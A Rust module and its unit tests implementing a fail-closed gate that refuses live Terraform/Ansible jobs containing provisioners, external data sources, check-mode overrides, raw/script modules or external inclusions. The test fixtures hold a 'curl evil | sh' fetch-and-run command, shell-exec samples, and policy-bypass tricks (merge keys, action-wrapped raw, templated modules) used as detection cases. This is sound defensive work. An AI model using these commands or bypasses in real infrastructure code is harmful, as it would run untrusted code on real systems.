//! Pre-dispatch policy gate for unsafe IaC constructs (missing-features #11).
//!
//! `LivePlan` / `LiveApply` jobs run against real platforms, and neither
//! `terraform plan` nor `ansible-playbook --check` is universally
//! side-effect-free: a Terraform `external` data source executes an arbitrary
//! program at *plan* time, provisioners execute arbitrary commands at apply
//! time, and an Ansible task can opt out of check mode entirely with
//! `check_mode: false`. Before a live-mode job is dispatched the control plane
//! scans the exact IaC bundle the job pins (and the agent re-checks the bundle
//! it resolved locally) for these constructs and refuses dispatch on any hit.
//!
//! The gate is fail-closed: content it cannot parse or attribute (unknown file
//! types, unparseable YAML, external task/role/playbook inclusions it cannot
//! see) is a violation, not a pass. `OfflineDryRun` is not gated — it configures
//! no providers and touches nothing.
//!
//! ## Scope & known fail-closed cases
//!
//! The gate runs only over the curated IaC bundles embedded in `ryuki-runner`
//! (the `OFFERINGS` registry), whose files are all `.tf` (HCL) or `.yml`/`.yaml`
//! (Ansible) — a conformance test asserts every bundled offering passes. Any
//! other file extension (notably Terraform's first-class JSON variant
//! `*.tf.json`, or a `*.tfvars`) is treated as `Unscannable` and REFUSED — this
//! HCL/YAML scanner does not parse JSON-form config, so it fails closed rather
//! than wave it through. If a `.tf.json` offering is ever bundled it must get a
//! JSON-aware scanner first. The HCL scan is also intentionally over-eager:
//! literal text like `provisioner "local-exec"` inside a heredoc or comment is
//! refused. Both are deliberate fail-safe choices (refuse, never leak); neither
//! is reachable for the current curated bundles.

use serde::{Deserialize, Serialize};

/// Version tag recorded in refusal messages and audit detail so operators can
/// tell which rule set rejected a bundle.
pub const IAC_POLICY_VERSION: &str = "iac-policy-v1";

/// A single policy violation found in an IaC bundle.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct IacPolicyViolation {
    /// Bundle-relative file name the violation was found in.
    pub file: String,
    /// Which rule fired.
    pub rule: IacPolicyRule,
    /// Human-oriented locator: `line N` for Terraform, the task/play name (or
    /// index) for Ansible, or a parse-failure summary.
    pub locator: String,
}

impl std::fmt::Display for IacPolicyViolation {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}: {} ({})", self.file, self.rule, self.locator)
    }
}

/// The rule set enforced by [`evaluate_iac_bundle`].
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum IacPolicyRule {
    /// Any Terraform `provisioner` block (`local-exec`, `remote-exec`, `file`,
    /// or vendor). Provisioners are imperative apply-time actions outside the
    /// declared resource graph; no sanctioned offering uses one.
    TerraformProvisioner,
    /// Terraform `data "external"` — executes an arbitrary program at plan
    /// time, so even a LivePlan would run attacker-chosen code.
    TerraformExternalDataSource,
    /// Ansible `check_mode: false` (or the legacy `always_run: true`) — forces
    /// the task to execute even under `--check`.
    AnsibleCheckModeOverride,
    /// Ansible `raw` / `script` — arbitrary execution that bypasses the module
    /// subsystem and cannot be audited structurally.
    AnsibleForbiddenModule,
    /// Content the gate cannot see or attribute: external task/role
    /// inclusions, unparseable YAML, non-mapping task entries, or a file type
    /// the gate does not understand. Fail-closed.
    Unscannable,
}

impl std::fmt::Display for IacPolicyRule {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            IacPolicyRule::TerraformProvisioner => write!(f, "terraform provisioner block"),
            IacPolicyRule::TerraformExternalDataSource => {
                write!(f, "terraform external data source")
            }
            IacPolicyRule::AnsibleCheckModeOverride => write!(f, "ansible check-mode override"),
            IacPolicyRule::AnsibleForbiddenModule => write!(f, "ansible raw/script module"),
            IacPolicyRule::Unscannable => write!(f, "unscannable content"),
        }
    }
}

/// Scan every file in an IaC bundle. Empty result = the bundle is
/// dispatchable in a live mode. Non-empty = the caller must refuse dispatch.
pub fn evaluate_iac_bundle<'a>(
    files: impl IntoIterator<Item = (&'a str, &'a str)>,
) -> Vec<IacPolicyViolation> {
    let mut violations = Vec::new();
    for (name, content) in files {
        let lower = name.to_ascii_lowercase();
        if lower.ends_with(".tf") {
            violations.extend(scan_terraform(name, content));
        } else if lower.ends_with(".yml") || lower.ends_with(".yaml") {
            violations.extend(scan_ansible(name, content));
        } else {
            violations.push(IacPolicyViolation {
                file: name.to_string(),
                rule: IacPolicyRule::Unscannable,
                locator: "unrecognized file type".to_string(),
            });
        }
    }
    violations
}

// ---------------------------------------------------------------------------
// Terraform
// ---------------------------------------------------------------------------

/// Line-based HCL scan. Sound because HCL block labels must sit on the same
/// line as the block identifier (`provisioner "local-exec" {`), so a
/// per-line match cannot be split-defeated. Comment lines (`#`, `//`) and
/// `/* ... */` ranges are skipped.
pub fn scan_terraform(file: &str, content: &str) -> Vec<IacPolicyViolation> {
    let mut violations = Vec::new();
    let mut in_block_comment = false;
    for (idx, raw_line) in content.lines().enumerate() {
        let mut line = raw_line;
        if in_block_comment {
            match line.find("*/") {
                Some(end) => {
                    line = &line[end + 2..];
                    in_block_comment = false;
                }
                None => continue,
            }
        }
        let trimmed = line.trim_start();
        if trimmed.starts_with('#') || trimmed.starts_with("//") {
            continue;
        }
        // Strip a trailing block-comment opener so `provisioner /* ... ` on
        // one line is still seen but commented content is not.
        let effective = match line.find("/*") {
            Some(start) => {
                in_block_comment = !line[start..].contains("*/");
                &line[..start]
            }
            None => line,
        };
        let locator = format!("line {}", idx + 1);
        if terraform_block_matches(effective, "provisioner", None) {
            violations.push(IacPolicyViolation {
                file: file.to_string(),
                rule: IacPolicyRule::TerraformProvisioner,
                locator,
            });
        } else if terraform_block_matches(effective, "data", Some("external")) {
            violations.push(IacPolicyViolation {
                file: file.to_string(),
                rule: IacPolicyRule::TerraformExternalDataSource,
                locator,
            });
        }
    }
    violations
}

/// Match `keyword "label" ...` at a token boundary. With `label = None` any
/// first label matches (used for `provisioner`, where every type is refused).
fn terraform_block_matches(line: &str, keyword: &str, label: Option<&str>) -> bool {
    let mut rest = line;
    while let Some(pos) = rest.find(keyword) {
        let before_ok = pos == 0
            || !rest[..pos]
                .chars()
                .next_back()
                .is_some_and(|c| c.is_alphanumeric() || c == '_');
        let after = &rest[pos + keyword.len()..];
        let after_ok = !after
            .chars()
            .next()
            .is_some_and(|c| c.is_alphanumeric() || c == '_');
        if before_ok && after_ok {
            let after_trim = after.trim_start();
            if let Some(stripped) = after_trim.strip_prefix('"') {
                match label {
                    None => return true,
                    Some(want) => {
                        if stripped
                            .strip_prefix(want)
                            .is_some_and(|r| r.starts_with('"'))
                        {
                            return true;
                        }
                    }
                }
            }
        }
        rest = &rest[pos + keyword.len()..];
    }
    false
}

// ---------------------------------------------------------------------------
// Ansible
// ---------------------------------------------------------------------------

/// Play-level keys whose values are task lists.
const PLAY_TASK_SECTIONS: &[&str] = &["tasks", "pre_tasks", "post_tasks", "handlers"];
/// Task-level keys whose values are nested task lists.
const TASK_NESTED_SECTIONS: &[&str] = &["block", "rescue", "always"];
/// Module names that are refused outright (after prefix stripping).
const FORBIDDEN_MODULES: &[&str] = &["raw", "script"];
/// Inclusion modules whose content the gate cannot see. Fail-closed.
const EXTERNAL_INCLUSIONS: &[&str] = &[
    "include_tasks",
    "import_tasks",
    "include_role",
    "import_role",
    "include",
];

/// Parse a playbook (all YAML documents) and walk every play, task list, and
/// nested block. Parse failures and unscannable structures are violations.
pub fn scan_ansible(file: &str, content: &str) -> Vec<IacPolicyViolation> {
    let mut violations = Vec::new();
    let mut parsed_any = false;
    for document in serde_yaml::Deserializer::from_str(content) {
        match serde_yaml::Value::deserialize(document) {
            Ok(mut value) => {
                parsed_any = true;
                // Resolve YAML merge keys (`<<: *anchor`) BEFORE scanning —
                // Ansible's loader applies merges, so a dirty task hidden behind a
                // merge key would otherwise be walked as an opaque `<<` key and its
                // merged-in `raw`/`check_mode: false` fields missed. On a merge
                // error, fail closed (unscannable) rather than scanning a
                // partially-merged tree.
                if let Err(err) = value.apply_merge() {
                    violations.push(IacPolicyViolation {
                        file: file.to_string(),
                        rule: IacPolicyRule::Unscannable,
                        locator: format!("yaml merge-key resolution failed: {err}"),
                    });
                    return violations;
                }
                scan_ansible_document(file, &value, &mut violations);
            }
            Err(err) => {
                violations.push(IacPolicyViolation {
                    file: file.to_string(),
                    rule: IacPolicyRule::Unscannable,
                    locator: format!("yaml parse error: {err}"),
                });
                return violations;
            }
        }
    }
    if !parsed_any {
        violations.push(IacPolicyViolation {
            file: file.to_string(),
            rule: IacPolicyRule::Unscannable,
            locator: "empty playbook".to_string(),
        });
    }
    violations
}

fn scan_ansible_document(
    file: &str,
    value: &serde_yaml::Value,
    violations: &mut Vec<IacPolicyViolation>,
) {
    let serde_yaml::Value::Sequence(plays) = value else {
        violations.push(IacPolicyViolation {
            file: file.to_string(),
            rule: IacPolicyRule::Unscannable,
            locator: "playbook root is not a play list".to_string(),
        });
        return;
    };
    for (play_idx, play) in plays.iter().enumerate() {
        let serde_yaml::Value::Mapping(play_map) = play else {
            violations.push(IacPolicyViolation {
                file: file.to_string(),
                rule: IacPolicyRule::Unscannable,
                locator: format!("play {} is not a mapping", play_idx + 1),
            });
            continue;
        };
        let play_name =
            mapping_str(play_map, "name").unwrap_or_else(|| format!("play {}", play_idx + 1));
        // Play-level references to external, un-scannable content. `roles:` pulls
        // in a role's tasks; `import_playbook` (a top-level element that is itself
        // a one-key mapping) pulls in a whole other playbook; play-level
        // include/import_* likewise. None of these are visible to this scan, so
        // fail closed. Keys are matched with the collection prefix stripped so an
        // FQCN spelling (`ansible.builtin.import_playbook`) can't slip past. An
        // EMPTY `roles: []` references nothing, so it is not flagged.
        let has_external_key = play_map.iter().any(|(k, v)| {
            let Some(m) = k.as_str().map(strip_module_prefix) else {
                return false;
            };
            match m {
                "roles" => {
                    !matches!(v, serde_yaml::Value::Sequence(s) if s.is_empty())
                        && !matches!(v, serde_yaml::Value::Null)
                }
                "import_playbook" => true,
                other => is_inclusion_module(other),
            }
        });
        if has_external_key {
            violations.push(IacPolicyViolation {
                file: file.to_string(),
                rule: IacPolicyRule::Unscannable,
                locator: format!("{play_name}: references external playbook/role content"),
            });
        }
        // A play-level check-mode override cascades to every task in the play.
        scan_check_mode_keys(file, play_map, &play_name, violations);
        for section in PLAY_TASK_SECTIONS {
            if let Some(serde_yaml::Value::Sequence(tasks)) = play_map.get(section) {
                for (task_idx, task) in tasks.iter().enumerate() {
                    scan_ansible_task(file, task, &play_name, section, task_idx, violations);
                }
            }
        }
    }
}

fn scan_ansible_task(
    file: &str,
    task: &serde_yaml::Value,
    play_name: &str,
    section: &str,
    task_idx: usize,
    violations: &mut Vec<IacPolicyViolation>,
) {
    let serde_yaml::Value::Mapping(task_map) = task else {
        violations.push(IacPolicyViolation {
            file: file.to_string(),
            rule: IacPolicyRule::Unscannable,
            locator: format!("{play_name}/{section}[{task_idx}] is not a mapping"),
        });
        return;
    };
    let task_name =
        mapping_str(task_map, "name").unwrap_or_else(|| format!("{section}[{task_idx}]"));
    let locator = format!("{play_name}: {task_name}");

    scan_check_mode_keys(file, task_map, &locator, violations);

    for (key, value) in task_map {
        let Some(key) = key.as_str() else { continue };
        let module = strip_module_prefix(key);
        if FORBIDDEN_MODULES.contains(&module) {
            violations.push(IacPolicyViolation {
                file: file.to_string(),
                rule: IacPolicyRule::AnsibleForbiddenModule,
                locator: format!("{locator} ({module})"),
            });
        }
        if is_inclusion_module(module) {
            violations.push(IacPolicyViolation {
                file: file.to_string(),
                rule: IacPolicyRule::Unscannable,
                locator: format!("{locator} ({module} references external content)"),
            });
        }
        // `action:` / `local_action:` name the real module inside their value
        // (`action: raw id` or `action: {module: raw id}`). Resolve that module
        // and apply BOTH the forbidden-module and external-inclusion checks — a
        // `raw`/`script` or an `include_tasks` wrapped in `action` must not slip
        // past the direct-key checks above.
        if (module == "local_action" || module == "action")
            && let Some(action_module) = action_module_name(value)
        {
            if action_module.contains("{{") {
                // A templated module name (`action: "{{ m }} id"`) resolves at
                // runtime to an arbitrary module — the static scan cannot tell if
                // it becomes raw/script/include. Fail closed.
                violations.push(IacPolicyViolation {
                    file: file.to_string(),
                    rule: IacPolicyRule::Unscannable,
                    locator: format!("{locator} ({key}: templated module name)"),
                });
            }
            if FORBIDDEN_MODULES.contains(&action_module.as_str()) {
                violations.push(IacPolicyViolation {
                    file: file.to_string(),
                    rule: IacPolicyRule::AnsibleForbiddenModule,
                    locator: format!("{locator} ({key}: {action_module})"),
                });
            }
            if is_inclusion_module(&action_module) {
                violations.push(IacPolicyViolation {
                    file: file.to_string(),
                    rule: IacPolicyRule::Unscannable,
                    locator: format!(
                        "{locator} ({key}: {action_module} references external content)"
                    ),
                });
            }
        }
        if TASK_NESTED_SECTIONS.contains(&module)
            && let serde_yaml::Value::Sequence(nested) = value
        {
            for (nested_idx, nested_task) in nested.iter().enumerate() {
                scan_ansible_task(file, nested_task, play_name, module, nested_idx, violations);
            }
        }
    }
}

/// Strip a known Ansible collection prefix so `ansible.builtin.raw` and
/// `ansible.legacy.raw` are compared as `raw`. `raw`/`script` are builtin, so
/// these two prefixes cover every spelling an attacker could use for them.
fn strip_module_prefix(name: &str) -> &str {
    name.strip_prefix("ansible.builtin.")
        .or_else(|| name.strip_prefix("ansible.legacy."))
        .unwrap_or(name)
}

fn is_inclusion_module(module: &str) -> bool {
    EXTERNAL_INCLUSIONS.contains(&module)
}

/// Flag a check-mode OVERRIDE — `check_mode` present with a non-truthy value, or
/// the legacy `always_run: true`. We flag on "not clearly true" (rather than
/// enumerating false spellings) so every Ansible-falsy value is caught:
/// `false`/`no`/`off`/`n`/`f`, the integer `0`, `"0"`, and even a templated
/// `{{ ... }}` value we cannot prove is true. `check_mode: true` (SAFE — forces
/// check mode on) is never flagged.
fn scan_check_mode_keys(
    file: &str,
    map: &serde_yaml::Mapping,
    locator: &str,
    violations: &mut Vec<IacPolicyViolation>,
) {
    if map.get("check_mode").is_some_and(|v| !yaml_is_truthy(v)) {
        violations.push(IacPolicyViolation {
            file: file.to_string(),
            rule: IacPolicyRule::AnsibleCheckModeOverride,
            locator: format!("{locator} (check_mode is not truthy → runs under --check)"),
        });
    }
    if map.get("always_run").is_some_and(yaml_is_truthy) {
        violations.push(IacPolicyViolation {
            file: file.to_string(),
            rule: IacPolicyRule::AnsibleCheckModeOverride,
            locator: format!("{locator} (always_run: true)"),
        });
    }
}

/// True only for values Ansible coerces to boolean TRUE: native `true`, a
/// non-zero number, or a truthy string token (`yes/true/on/1/y/t`). Everything
/// else — including `false`/`no`/`off`/`n`/`f`, `0`, and a template expression —
/// is treated as not-true (fail-safe for the check-mode gate).
fn yaml_is_truthy(value: &serde_yaml::Value) -> bool {
    match value {
        serde_yaml::Value::Bool(b) => *b,
        serde_yaml::Value::Number(n) => n.as_f64().is_some_and(|f| f != 0.0),
        serde_yaml::Value::String(s) => {
            matches!(
                s.trim().to_ascii_lowercase().as_str(),
                "yes" | "true" | "on" | "1" | "y" | "t"
            )
        }
        _ => false,
    }
}

/// Extract the real module name from a `local_action` / `action` value: a string
/// (`"raw id"` — first whitespace token) or a mapping with a `module` key whose
/// value is itself `"<module> <args>"` (first token). Collection prefix stripped.
fn action_module_name(value: &serde_yaml::Value) -> Option<String> {
    let raw = match value {
        serde_yaml::Value::String(s) => s.split_whitespace().next(),
        serde_yaml::Value::Mapping(m) => m
            .get("module")
            .and_then(|v| v.as_str())
            .and_then(|module| module.split_whitespace().next()),
        _ => None,
    }?;
    Some(strip_module_prefix(raw).to_string())
}

fn mapping_str(map: &serde_yaml::Mapping, key: &str) -> Option<String> {
    map.get(key).and_then(|v| v.as_str()).map(str::to_string)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules(violations: &[IacPolicyViolation]) -> Vec<&IacPolicyRule> {
        violations.iter().map(|v| &v.rule).collect()
    }

    // ── Terraform ────────────────────────────────────────────────────────

    #[test]
    fn terraform_local_exec_provisioner_is_flagged() {
        let tf = r#"
resource "null_resource" "x" {
  provisioner "local-exec" {
    command = "curl evil | sh"
  }
}
"#;
        let v = scan_terraform("main.tf", tf);
        assert_eq!(rules(&v), vec![&IacPolicyRule::TerraformProvisioner]);
        assert_eq!(v[0].locator, "line 3");
    }

    #[test]
    fn terraform_remote_exec_and_file_provisioners_are_flagged() {
        let tf = "provisioner \"remote-exec\" {}\nprovisioner \"file\" {}\n";
        let v = scan_terraform("main.tf", tf);
        assert_eq!(
            rules(&v),
            vec![
                &IacPolicyRule::TerraformProvisioner,
                &IacPolicyRule::TerraformProvisioner
            ]
        );
    }

    #[test]
    fn terraform_external_data_source_is_flagged() {
        let tf = "data \"external\" \"probe\" {\n  program = [\"/bin/sh\", \"-c\", \"id\"]\n}\n";
        let v = scan_terraform("main.tf", tf);
        assert_eq!(rules(&v), vec![&IacPolicyRule::TerraformExternalDataSource]);
    }

    #[test]
    fn terraform_benign_data_sources_and_comments_pass() {
        let tf = r#"
# provisioner "local-exec" would be bad
// data "external" "x" {}
/* provisioner "remote-exec" {} */
data "docker_image" "nginx" {
  name = "nginx:stable"
}
resource "docker_container" "web" {
  name  = "web"
  image = data.docker_image.nginx.id
}
"#;
        assert!(scan_terraform("main.tf", tf).is_empty());
    }

    #[test]
    fn terraform_multiline_block_comment_hides_content() {
        let tf = "/*\nprovisioner \"local-exec\" {}\n*/\nresource \"a\" \"b\" {}\n";
        assert!(scan_terraform("main.tf", tf).is_empty());
    }

    #[test]
    fn terraform_identifier_substrings_do_not_match() {
        // `my_provisioner` and `data_external` are ordinary identifiers.
        let tf = "variable \"my_provisioner\" {}\nlocals { data_external = 1 }\n";
        assert!(scan_terraform("main.tf", tf).is_empty());
    }

    // ── Ansible ──────────────────────────────────────────────────────────

    #[test]
    fn ansible_check_mode_false_is_flagged_bool_and_yaml11() {
        for spelling in ["false", "no", "off"] {
            let yml = format!(
                "- name: p\n  hosts: localhost\n  tasks:\n    - name: t\n      ansible.builtin.command: id\n      check_mode: {spelling}\n"
            );
            let v = scan_ansible("play.yml", &yml);
            assert_eq!(
                rules(&v),
                vec![&IacPolicyRule::AnsibleCheckModeOverride],
                "spelling {spelling}"
            );
        }
    }

    #[test]
    fn ansible_play_level_check_mode_override_is_flagged() {
        let yml = "- name: p\n  hosts: all\n  check_mode: false\n  tasks: []\n";
        let v = scan_ansible("play.yml", yml);
        assert_eq!(rules(&v), vec![&IacPolicyRule::AnsibleCheckModeOverride]);
    }

    #[test]
    fn ansible_always_run_is_flagged() {
        let yml = "- name: p\n  hosts: all\n  tasks:\n    - name: t\n      debug:\n        msg: hi\n      always_run: yes\n";
        let v = scan_ansible("play.yml", yml);
        assert_eq!(rules(&v), vec![&IacPolicyRule::AnsibleCheckModeOverride]);
    }

    #[test]
    fn ansible_raw_and_script_modules_are_flagged_with_prefixes() {
        let yml = "- name: p\n  hosts: all\n  tasks:\n    - name: a\n      raw: uname -a\n    - name: b\n      ansible.builtin.script: ./x.sh\n";
        let v = scan_ansible("play.yml", yml);
        assert_eq!(
            rules(&v),
            vec![
                &IacPolicyRule::AnsibleForbiddenModule,
                &IacPolicyRule::AnsibleForbiddenModule
            ]
        );
    }

    #[test]
    fn ansible_local_action_raw_is_flagged() {
        let yml = "- name: p\n  hosts: all\n  tasks:\n    - name: t\n      local_action: raw id\n";
        let v = scan_ansible("play.yml", yml);
        assert_eq!(rules(&v), vec![&IacPolicyRule::AnsibleForbiddenModule]);
    }

    // ── Adversarial-review regressions (GPT-5.5 Codex bypasses) ────────────

    #[test]
    fn ansible_check_mode_falsy_coercions_are_flagged() {
        // Ansible coerces 0, "0", "n", "f" (etc.) to boolean false — each forces
        // the task to run under --check. All must be flagged as an override.
        for spelling in ["0", "\"0\"", "n", "f", "\"no\"", "0.0"] {
            let yml = format!(
                "- name: p\n  hosts: all\n  tasks:\n    - name: t\n      ansible.builtin.command: id\n      check_mode: {spelling}\n"
            );
            let v = scan_ansible("play.yml", &yml);
            assert!(
                v.iter()
                    .any(|x| x.rule == IacPolicyRule::AnsibleCheckModeOverride),
                "check_mode: {spelling} must be flagged as an override; got {v:?}"
            );
        }
    }

    #[test]
    fn ansible_check_mode_true_is_not_flagged() {
        // check_mode: true FORCES check mode on (safe/more restrictive) — must NOT flag.
        for spelling in ["true", "yes", "\"1\"", "on"] {
            let yml = format!(
                "- name: p\n  hosts: all\n  tasks:\n    - name: t\n      ansible.builtin.command: id\n      check_mode: {spelling}\n"
            );
            let v = scan_ansible("play.yml", &yml);
            assert!(
                !v.iter()
                    .any(|x| x.rule == IacPolicyRule::AnsibleCheckModeOverride),
                "check_mode: {spelling} (truthy) must NOT be flagged; got {v:?}"
            );
        }
    }

    #[test]
    fn ansible_action_mapping_hides_raw_with_inline_args_is_flagged() {
        // `action: {module: "raw id"}` — the module value carries inline args;
        // the first token is the real module and must be checked.
        let yml = "- name: p\n  hosts: all\n  tasks:\n    - name: t\n      action:\n        module: raw id\n";
        let v = scan_ansible("play.yml", yml);
        assert!(
            v.iter()
                .any(|x| x.rule == IacPolicyRule::AnsibleForbiddenModule),
            "raw via action-mapping module with args must be flagged: {v:?}"
        );
    }

    #[test]
    fn ansible_action_wrapped_include_tasks_is_unscannable() {
        let yml = "- name: p\n  hosts: all\n  tasks:\n    - name: t\n      action: include_tasks file=evil.yml\n";
        let v = scan_ansible("play.yml", yml);
        assert!(
            v.iter().any(|x| x.rule == IacPolicyRule::Unscannable),
            "include_tasks via action must fail closed: {v:?}"
        );
    }

    #[test]
    fn ansible_yaml_merge_key_dirty_task_is_flagged() {
        // A dirty task hidden behind a YAML merge key must be resolved and caught.
        let yml = r#"
- name: p
  hosts: all
  vars:
    dirty: &dirty
      ansible.builtin.command: id
      check_mode: false
  tasks:
    - name: merged
      <<: *dirty
"#;
        let v = scan_ansible("play.yml", yml);
        assert!(
            v.iter()
                .any(|x| x.rule == IacPolicyRule::AnsibleCheckModeOverride),
            "check_mode:false merged via <<: anchor must be flagged: {v:?}"
        );
    }

    #[test]
    fn ansible_templated_action_module_is_unscannable() {
        // A templated module name resolves at runtime — fail closed.
        let yml = "- name: p\n  hosts: all\n  vars:\n    m: raw\n  tasks:\n    - action: \"{{ m }} id\"\n";
        let v = scan_ansible("play.yml", yml);
        assert!(
            v.iter().any(|x| x.rule == IacPolicyRule::Unscannable),
            "a templated action module must fail closed: {v:?}"
        );
    }

    #[test]
    fn ansible_empty_roles_list_is_not_flagged() {
        // `roles: []` references nothing — must not over-refuse a legit play.
        let yml = "- name: p\n  hosts: all\n  roles: []\n  tasks:\n    - ansible.builtin.debug:\n        msg: ok\n";
        assert!(
            scan_ansible("play.yml", yml).is_empty(),
            "an empty roles list must not be flagged"
        );
        // A NON-empty roles list still fails closed.
        let yml2 = "- name: p\n  hosts: all\n  roles:\n    - some_role\n";
        assert_eq!(
            rules(&scan_ansible("play.yml", yml2)),
            vec![&IacPolicyRule::Unscannable]
        );
    }

    #[test]
    fn ansible_top_level_import_playbook_is_unscannable() {
        let yml = "- import_playbook: /tmp/evil.yml\n";
        let v = scan_ansible("play.yml", yml);
        assert_eq!(rules(&v), vec![&IacPolicyRule::Unscannable]);

        // FQCN spelling must also fail closed.
        let fqcn = "- ansible.builtin.import_playbook: /tmp/evil.yml\n";
        assert_eq!(
            rules(&scan_ansible("play.yml", fqcn)),
            vec![&IacPolicyRule::Unscannable]
        );
    }

    #[test]
    fn ansible_nested_block_tasks_are_scanned() {
        let yml = r#"
- name: p
  hosts: all
  tasks:
    - name: outer
      block:
        - name: inner
          ansible.builtin.raw: id
      rescue:
        - name: cleanup
          check_mode: false
          ansible.builtin.debug:
            msg: x
"#;
        let v = scan_ansible("play.yml", yml);
        assert!(
            v.iter()
                .any(|x| x.rule == IacPolicyRule::AnsibleForbiddenModule)
        );
        assert!(
            v.iter()
                .any(|x| x.rule == IacPolicyRule::AnsibleCheckModeOverride)
        );
    }

    #[test]
    fn ansible_external_inclusions_and_roles_are_unscannable() {
        let yml = "- name: p\n  hosts: all\n  roles:\n    - some_role\n  tasks:\n    - name: t\n      include_tasks: other.yml\n";
        let v = scan_ansible("play.yml", yml);
        assert_eq!(
            rules(&v),
            vec![&IacPolicyRule::Unscannable, &IacPolicyRule::Unscannable]
        );
    }

    #[test]
    fn ansible_parse_error_and_empty_are_unscannable() {
        assert_eq!(
            rules(&scan_ansible("bad.yml", "- name: [unclosed")),
            vec![&IacPolicyRule::Unscannable]
        );
        assert_eq!(
            rules(&scan_ansible("empty.yml", "")),
            vec![&IacPolicyRule::Unscannable]
        );
    }

    #[test]
    fn ansible_clean_check_safe_playbook_passes() {
        let yml = r#"
- name: Dry-run check
  hosts: localhost
  connection: local
  gather_facts: false
  tasks:
    - name: Assert site
      ansible.builtin.assert:
        that:
          - site is defined
    - name: Log
      ansible.builtin.debug:
        msg: "ok"
"#;
        assert!(scan_ansible("play.yml", yml).is_empty());
    }

    // ── Bundle dispatch ──────────────────────────────────────────────────

    #[test]
    fn bundle_mixed_files_route_to_the_right_scanner() {
        let files = [
            ("main.tf", "provisioner \"local-exec\" {}\n"),
            (
                "play.yml",
                "- name: p\n  hosts: all\n  tasks:\n    - raw: id\n",
            ),
        ];
        let v = evaluate_iac_bundle(files);
        assert_eq!(v.len(), 2);
        assert_eq!(v[0].rule, IacPolicyRule::TerraformProvisioner);
        assert_eq!(v[1].rule, IacPolicyRule::AnsibleForbiddenModule);
    }

    #[test]
    fn bundle_unknown_file_type_is_unscannable() {
        let v = evaluate_iac_bundle([("run.sh", "#!/bin/sh\nid\n")]);
        assert_eq!(rules(&v), vec![&IacPolicyRule::Unscannable]);
    }

    #[test]
    fn bundle_clean_terraform_passes() {
        let v = evaluate_iac_bundle([(
            "main.tf",
            "terraform {\n  required_version = \">= 1.5\"\n}\nresource \"null_resource\" \"ok\" {}\n",
        )]);
        assert!(v.is_empty());
    }
}
